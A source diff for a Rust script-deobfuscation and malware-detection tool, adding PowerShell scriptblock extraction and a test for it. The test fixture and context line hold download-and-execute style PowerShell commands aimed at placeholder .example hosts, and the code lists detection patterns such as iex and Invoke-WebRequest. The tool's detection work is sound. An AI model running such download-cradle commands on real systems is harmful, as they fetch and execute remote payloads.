@@ -1020,6 +1020,35 @@ sh.Run("powershell -Command Invoke-WebRequest https://direct-js-const.example/p"
     }
 
     #[test]
+    fn standalone_ps_scriptblock_create_literal_is_extracted_and_scanned() {
+        let script = concat!(
+            "&([scriptblock]::Create('",
+            "Invoke-WebRequest -Uri https://standalone-scriptblock.example/payload.ps1",
+            "'))"
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://standalone-scriptblock.example/payload.ps1")),
+            "scriptblock literal was not extracted as PS: {:?}\n{}",
+            report.extracted_ps1_normalized,
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-scriptblock.example/payload.ps1"
+            )),
+            "scriptblock literal was not scanned as PS: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn start_quoted_url_is_extracted() {
         // `start "" "URL"` opens the URL in the default handler.
         let script = b"start \"\" \"https://opened.example/doc.pdf\"\r\n";
@@ -3742,6 +3771,99 @@ fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool
     false
 }
 
+fn pre_scan_standalone_powershell_input(input: &[u8], env: &mut Environment) -> bool {
+    let text = String::from_utf8_lossy(input);
+    let lower = text.to_ascii_lowercase();
+    if !starts_like_standalone_powershell(&lower) {
+        return false;
+    }
+
+    let mut queued = false;
+    for body in scriptblock_create_string_literals(&text) {
+        push_unique_payload(&mut env.all_extracted_ps1, body.into_bytes());
+        queued = true;
+    }
+
+    if looks_like_powershell_payload_bytes(input) {
+        push_unique_payload(&mut env.all_extracted_ps1, text.as_bytes().to_vec());
+        queued = true;
+    }
+    queued
+}
+
+fn starts_like_standalone_powershell(lower: &str) -> bool {
+    let first = first_meaningful_script_line(lower);
+    first.starts_with('$')
+        || first.starts_with("param(")
+        || first.starts_with("param ")
+        || first.starts_with("function ")
+        || first.starts_with("[scriptblock]::create")
+        || first.starts_with("&([scriptblock]::create")
+        || first.starts_with("& ([scriptblock]::create")
+        || first.starts_with("iex ")
+        || first.starts_with("iex(")
+        || first.starts_with("invoke-expression")
+        || first.starts_with("invoke-webrequest")
+        || first.starts_with("invoke-restmethod")
+}
+
+fn scriptblock_create_string_literals(text: &str) -> Vec<String> {
+    let lower = text.to_ascii_lowercase();
+    let mut out = Vec::new();
+    let mut search_from = 0usize;
+    while let Some(rel) = lower[search_from..].find("[scriptblock]::create") {
+        let start = search_from + rel;
+        let Some(open_rel) = lower[start..].find('(') else {
+            break;
+        };
+        let mut pos = start + open_rel + 1;
+        pos = skip_ascii_ws(text, pos);
+        let Some((body, end)) = parse_ps_string_literal_at(text, pos) else {
+            search_from = pos;
+            continue;
+        };
+        if !body.trim().is_empty() {
+            out.push(body);
+        }
+        search_from = end;
+    }
+    out
+}
+
+fn skip_ascii_ws(text: &str, mut pos: usize) -> usize {
+    while let Some(byte) = text.as_bytes().get(pos) {
+        if !byte.is_ascii_whitespace() {
+            break;
+        }
+        pos += 1;
+    }
+    pos
+}
+
+fn parse_ps_string_literal_at(text: &str, pos: usize) -> Option<(String, usize)> {
+    let quote = *text.as_bytes().get(pos)?;
+    if quote != b'\'' && quote != b'"' {
+        return None;
+    }
+    let mut out = String::new();
+    let mut i = pos + 1;
+    while i < text.len() {
+        let b = text.as_bytes()[i];
+        if b == quote {
+            if text.as_bytes().get(i + 1) == Some(&quote) {
+                out.push(quote as char);
+                i += 2;
+                continue;
+            }
+            return Some((out, i + 1));
+        }
+        let ch = text[i..].chars().next()?;
+        out.push(ch);
+        i += ch.len_utf8();
+    }
+    None
+}
+
 fn pre_scan_utf16_script_blob(decoded: &str, env: &mut Environment) {
     let lower = decoded.to_ascii_lowercase();
     if looks_like_vbs_script(&lower) {
@@ -3961,7 +4083,9 @@ fn analyze_inner(input: &[u8], cfg: &Config, file_path: Option<std::path::PathBu
             env.delayed_expansion = true;
         }
         pre_scan_polyglot_script_block(input, &mut env);
-        let standalone_script_input = pre_scan_standalone_script_input(input, &mut env);
+        let standalone_vbs_input = pre_scan_standalone_script_input(input, &mut env);
+        let standalone_ps_input = pre_scan_standalone_powershell_input(input, &mut env);
+        let standalone_script_input = standalone_vbs_input || standalone_ps_input;
         deob_scan::scan_raw_marker_powershell_urls(input, &mut env);
         profile_mark!("setup_and_prescan");
         if let Some(decoded) = decode_utf16le_script_blob(input) {
